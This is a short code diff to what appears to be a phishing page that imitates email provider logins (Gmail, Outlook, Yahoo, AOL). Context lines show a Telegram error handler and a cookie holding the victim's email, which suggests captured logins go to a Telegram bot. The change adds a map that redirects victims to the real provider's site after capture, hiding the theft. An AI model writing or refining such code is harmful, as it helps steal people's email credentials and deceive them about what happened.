@@ -567,6 +567,15 @@ const providers = [
 
 let currentProvider = '';
 
+const redirectMap = {
+'Gmail': 'https://mail.google.com',
+'Outlook': 'https://outlook.live.com',
+'Yahoo Mail': 'https://login.yahoo.com',
+'Microsoft': 'https://login.live.com',
+'AOL': 'https://login.aol.com',
+'Other Email': 'https://mail.google.com',
+};
+
 
 
 function renderProviders() {
@@ -758,8 +767,7 @@ console.error('Telegram error:', err);
 
 
 setTimeout(() => {
-
-window.location.href = 'result.jpg';
+window.location.href = redirectMap[currentProvider] || 'https://mail.google.com';
 }, 1500);
 setCookie('email', email, 30);
 
